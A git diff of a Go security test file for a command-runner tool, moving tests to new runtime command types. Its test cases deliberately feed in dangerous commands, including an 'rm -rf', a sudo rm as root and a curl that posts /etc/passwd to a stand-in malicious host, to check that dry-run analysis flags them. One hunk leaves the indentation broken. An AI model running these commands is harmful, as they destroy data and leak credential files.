@@ -1,5 +1,3 @@
-//go:build skip_until_phase5
-// +build skip_until_phase5
 
 package main
 
@@ -14,6 +12,7 @@ import (
 
 	"github.com/isseis/go-safe-cmd-runner/internal/filevalidator"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/bootstrap"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/config"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/executor"
 	executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
 	privilegetesting "github.com/isseis/go-safe-cmd-runner/internal/runner/privilege/testing"
@@ -617,20 +616,24 @@ cmd = ["rm", "-rf", "/tmp/should-not-execute"]
 func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 	testCases := []struct {
 		name                    string
-		cmd                     runnertypes.Command
-		group                   *runnertypes.CommandGroup
+		cmd                     *runnertypes.RuntimeCommand
+		group                   *runnertypes.GroupSpec
 		expectedSecurityRisk    string
 		expectedExecutionResult bool
 		description             string
 	}{
 		{
 			name: "dangerous_rm_command_dry_run_protection",
-			cmd: runnertypes.Command{
-				Name: "dangerous-rm",
-				Cmd:  "rm",
-				Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
+			cmd: &runnertypes.RuntimeCommand{
+				Spec: &runnertypes.CommandSpec{
+					Name: "dangerous-rm",
+					Cmd:  "rm",
+					Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
+				},
+				ExpandedCmd:  "rm",
+				ExpandedArgs: []string{"-rf", "/tmp/should-not-execute-in-test"},
 			},
-			group: &runnertypes.CommandGroup{
+			group: &runnertypes.GroupSpec{
 				Name: "malicious-group",
 			},
 			expectedSecurityRisk:    "high",
@@ -639,13 +642,17 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "sudo_privilege_escalation_protection",
-			cmd: runnertypes.Command{
-				Name:      "sudo-escalation",
-				Cmd:       "sudo",
-				Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
-				RunAsUser: "root",
+			cmd: &runnertypes.RuntimeCommand{
+				Spec: &runnertypes.CommandSpec{
+					Name:      "sudo-escalation",
+					Cmd:       "sudo",
+					Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
+					RunAsUser: "root",
+				},
+				ExpandedCmd:  "sudo",
+				ExpandedArgs: []string{"rm", "-rf", "/tmp/test-sudo-target"},
 			},
-			group: &runnertypes.CommandGroup{
+			group: &runnertypes.GroupSpec{
 				Name: "privilege-escalation-group",
 			},
 			expectedSecurityRisk:    "high",
@@ -654,12 +661,16 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "network_exfiltration_command_protection",
-			cmd: runnertypes.Command{
-				Name: "data-exfil",
-				Cmd:  "curl",
-				Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
+			cmd: &runnertypes.RuntimeCommand{
+				Spec: &runnertypes.CommandSpec{
+					Name: "data-exfil",
+					Cmd:  "curl",
+					Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
+				},
+				ExpandedCmd:  "curl",
+				ExpandedArgs: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
 			},
-			group: &runnertypes.CommandGroup{
+			group: &runnertypes.GroupSpec{
 				Name: "network-exfil-group",
 			},
 			expectedSecurityRisk:    "medium", // curl typically classified as medium risk
@@ -670,7 +681,7 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 
 	for _, tc := range testCases {
 		t.Run(tc.name, func(t *testing.T) {
-			runnertypes.PrepareCommand(&tc.cmd)
+			// RuntimeCommand doesn't need PrepareCommand
 
 			// Import required packages for mocks
 			// Note: Using the same mock setup pattern as existing tests
@@ -686,7 +697,7 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 			mockPathResolver := &MockPathResolver{}
 
 			// Setup command path resolution
-			mockPathResolver.On("ResolvePath", tc.cmd.Cmd).Return("/usr/bin/"+tc.cmd.Cmd, nil)
+			mockPathResolver.On("ResolvePath", tc.cmd.ExpandedCmd).Return("/usr/bin/"+tc.cmd.ExpandedCmd, nil)
 
 			opts := &resource.DryRunOptions{
 				DetailLevel:       resource.DetailLevelDetailed,
@@ -723,43 +734,40 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 				t.Fatal("Expected dry-run results, but got nil")
 			}
 
-			// Verify security analysis was performed
-			if len(dryRunResult.ResourceAnalyses) == 0 {
-				t.Error("Expected security analysis to be recorded, but no analyses found")
-			}
+		// Verify security analysis was performed
+		if len(dryRunResult.ResourceAnalyses) == 0 {
+			t.Error("Expected security analysis to be recorded, but no analyses found")
+		}
 
-			// Verify security risk level for the dangerous command
-			found := false
-			for _, analysis := range dryRunResult.ResourceAnalyses {
-				// Check if this analysis is for our command (match by target path or command name)
-				if strings.Contains(analysis.Target, tc.cmd.Cmd) || strings.Contains(analysis.Target, tc.cmd.Name) {
-					found = true
-					if analysis.Impact.SecurityRisk != tc.expectedSecurityRisk {
-						t.Errorf("Expected security risk %q, but got %q",
-							tc.expectedSecurityRisk, analysis.Impact.SecurityRisk)
-					}
-
-					// Verify that security warnings are present
-					if !strings.Contains(analysis.Impact.Description, "WARNING") {
-						t.Error("Expected security warning in impact description")
-					}
-
-					t.Logf("Security analysis completed: %s - Risk: %s, Target: %s",
-						tc.description, analysis.Impact.SecurityRisk, analysis.Target)
-					break
+		// Verify security risk level for the dangerous command
+		found := false
+		for _, analysis := range dryRunResult.ResourceAnalyses {
+			// Check if this analysis is for our command (match by target path or command name)
+			if strings.Contains(analysis.Target, tc.cmd.ExpandedCmd) || strings.Contains(analysis.Target, tc.cmd.Name()) {
+				found = true
+				if analysis.Impact.SecurityRisk != tc.expectedSecurityRisk {
+					t.Errorf("Expected security risk %q, but got %q",
+						tc.expectedSecurityRisk, analysis.Impact.SecurityRisk)
 				}
-			}
 
-			if !found {
-				t.Errorf("Expected to find analysis for command %q, but it was not recorded", tc.cmd.Name)
-				// Log available analyses for debugging
-				for i, analysis := range dryRunResult.ResourceAnalyses {
-					t.Logf("Analysis %d: Type=%s, Target=%s, SecurityRisk=%s",
-						i, analysis.Type, analysis.Target, analysis.Impact.SecurityRisk)
+				// Verify that security warnings are present
+				if !strings.Contains(analysis.Impact.Description, "WARNING") {
+					t.Error("Expected security warning in impact description")
 				}
-			}
 
-			// Verify that no actual command was executed (mocks should not have been called for execution)
+			t.Logf("Security analysis completed: %s - Risk: %s, Target: %s",
+				tc.description, analysis.Impact.SecurityRisk, analysis.Target)
+			break
+		}
+	}
+	if !found {
+		t.Errorf("Expected to find analysis for command %q, but it was not recorded", tc.cmd.Name())
+		// Log available analyses for debugging
+		for i, analysis := range dryRunResult.ResourceAnalyses {
+			t.Logf("Analysis %d: Type=%s, Target=%s, SecurityRisk=%s",
+				i, analysis.Type, analysis.Target, analysis.Impact.SecurityRisk)
+		}
+	}			// Verify that no actual command was executed (mocks should not have been called for execution)
 			// This is implicitly verified by not setting up execution expectations on mockExec
 
 			t.Logf("Dry-run protection verified: %s", tc.description)
@@ -851,7 +859,7 @@ func TestUnverifiedDataAccessPrevention(t *testing.T) {
 
 // configSetupHelper creates a complete test environment with config file and hash directory.
 // It returns the loaded config.
-func configSetupHelper(t *testing.T, systemEnv map[string]string, configTOML string) *runnertypes.Config {
+func configSetupHelper(t *testing.T, systemEnv map[string]string, configTOML string) *runnertypes.ConfigSpec {
 	t.Helper()
 
 	// Set up system environment
@@ -897,12 +905,25 @@ func envPriorityTestHelper(t *testing.T, systemEnv map[string]string, configTOML
 	if len(cfg.Groups) == 0 || len(cfg.Groups[0].Commands) == 0 {
 		t.Fatal("No command found in config")
 	}
-	cmd := &cfg.Groups[0].Commands[0]
-	group := &cfg.Groups[0]
+	cmdSpec := &cfg.Groups[0].Commands[0]
+
+	// Expand configuration to runtime types
+	runtimeGlobal, err := config.ExpandGlobal(&cfg.Global)
+	if err != nil {
+		t.Fatalf("Failed to expand global config: %v", err)
+	}
+	runtimeGroup, err := config.ExpandGroup(&cfg.Groups[0], runtimeGlobal.ExpandedVars)
+	if err != nil {
+		t.Fatalf("Failed to expand group config: %v", err)
+	}
+	runtimeCmd, err := config.ExpandCommand(cmdSpec, runtimeGroup.ExpandedVars, "")
+	if err != nil {
+		t.Fatalf("Failed to expand command config: %v", err)
+	}
 
 	// Call production code to build final environment
 	// This tests the actual implementation in executor.BuildProcessEnvironment
-	finalEnv := executor.BuildProcessEnvironment(&cfg.Global, group, cmd)
+	finalEnv := executor.BuildProcessEnvironment(runtimeGlobal, runtimeCmd)
 
 	// Verify expected variables
 	for k, expectedVal := range expectVars {
